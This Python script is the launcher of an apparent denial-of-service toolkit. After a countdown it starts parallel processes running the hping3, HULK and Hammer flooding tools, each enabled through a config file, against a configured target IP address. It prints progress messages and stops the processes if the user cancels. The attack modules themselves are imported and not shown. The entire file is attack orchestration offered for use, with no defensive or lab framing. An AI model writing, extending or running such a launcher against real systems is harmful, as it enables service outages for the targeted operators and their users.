"""
1. Start set tools in multi-processes
"""

import time
import multiprocessing as mp
from config import Config, Bcolors

config = Config()

if __name__ == "__main__":
    for i in range(config.waitTime):
        if config.printColor:
            print(
                f"\n{Bcolors.OKGREEN}{5-i} seconds before attacking {config.ATKIPv4}....{Bcolors.ENDC}"
            )
        else:
            print(f"\n{5-i} seconds before attacking {config.ATKIPv4}....")
        time.sleep(1)

    if config.printColor:
        print(f"\n{Bcolors.OKGREEN}Starting DoS attack...{Bcolors.ENDC}")
    else:
        print(f"\nStarting DoS attack...")
    try:
        processes = 0
        if config.HPING3:
            from hping3 import DOS

            dos = DOS(config.ATKIPv4, config.HPING3_PARAMETERS)
            p_hping3 = mp.Process(target=dos.spawnATKprocess)
            p_hping3.start()
            processes += 1
        if config.HULK:
            from hulk import hulk

            p_hulk = mp.Process(target=hulk)
            p_hulk.start()
            processes += 1
        if config.Hammer:
            from hammering import hammering

            p_hammer = mp.Process(target=hammering)
            p_hammer.start()
            processes += 1
        if processes == 0:
            if config.printColor:
                print(f"{Bcolors.FAIL}[-] No DoS tools selected.{Bcolors.ENDC}")
            else:
                print(f"[-] No DoS tools selected.")
            exit(0)
    except KeyboardInterrupt:
        if config.printColor:
            print(f"{Bcolors.FAIL}[-] Canceled by user{Bcolors.ENDC}")
        else:
            print(f"[-] Canceled by user")
        if config.HPING3:
            p_hping3.terminate()
        if config.Hammer:
            p_hammer.terminate()
        if config.HULK:
            p_hulk.terminate()

    if config.printColor:
        print(f"{Bcolors.OKGREEN}Started DoS attack.{Bcolors.ENDC}")
    else:
        print(f"Started DoS attack.")
